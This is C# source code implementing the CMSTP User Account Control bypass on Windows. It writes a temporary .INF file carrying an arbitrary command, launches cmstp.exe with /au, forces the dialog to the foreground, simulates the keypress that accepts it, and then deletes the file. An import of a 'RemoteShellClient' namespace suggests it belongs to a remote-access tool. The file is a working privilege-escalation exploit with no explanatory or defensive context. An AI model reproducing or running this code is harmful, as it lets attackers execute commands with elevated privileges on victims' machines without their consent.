using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Windows;
using System.Runtime.InteropServices;
using RemoteShellClient;

public class CMSTPBypass
{
    // Our .INF file data!
    public static string InfData = @"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""

";

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool SetForegroundWindow(IntPtr hWnd);

    private const string BinaryPath = @"c:\windows\system32\cmstp.exe";

    /* Generates a random named .inf file with command to be executed with UAC privileges */
    private static string SetInfFile(string commandToExecute)
    {
        var randomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        const string temporaryDir = @"C:\windows\temp";
        var outputFile = new StringBuilder();
        outputFile.Append(temporaryDir);
        outputFile.Append('\\');
        outputFile.Append(randomFileName);
        outputFile.Append(".inf");
        var newInfData = new StringBuilder(InfData);
        newInfData.Replace("REPLACE_COMMAND_LINE", commandToExecute);
        File.WriteAllText(outputFile.ToString(), newInfData.ToString());
        return outputFile.ToString();
    }

    public static bool Execute(string CommandToExecute)
    {
        if (!File.Exists(BinaryPath))
        {
            Console.WriteLine("Could not find cmstp.exe binary!");
            return false;
        }

        var infFile = SetInfFile(CommandToExecute);

        Console.WriteLine("Payload file written to " + infFile);
        var startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = "/au " + infFile;
        startInfo.UseShellExecute = false;
        Process.Start(startInfo);

        IntPtr windowHandle;
        do
        {
            windowHandle = SetWindowActive("cmstp");
        } while (windowHandle == IntPtr.Zero);


        SimulatePcControl.Enter();
        
        File.Delete(infFile);
        
        return true;
    }

    private static IntPtr SetWindowActive(string processName)
    {
        var target = Process.GetProcessesByName(processName);
        if (target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        var windowHandle = target[0].MainWindowHandle;
        if (windowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(windowHandle);
        ShowWindow(windowHandle, 5);
        return windowHandle;
    }
}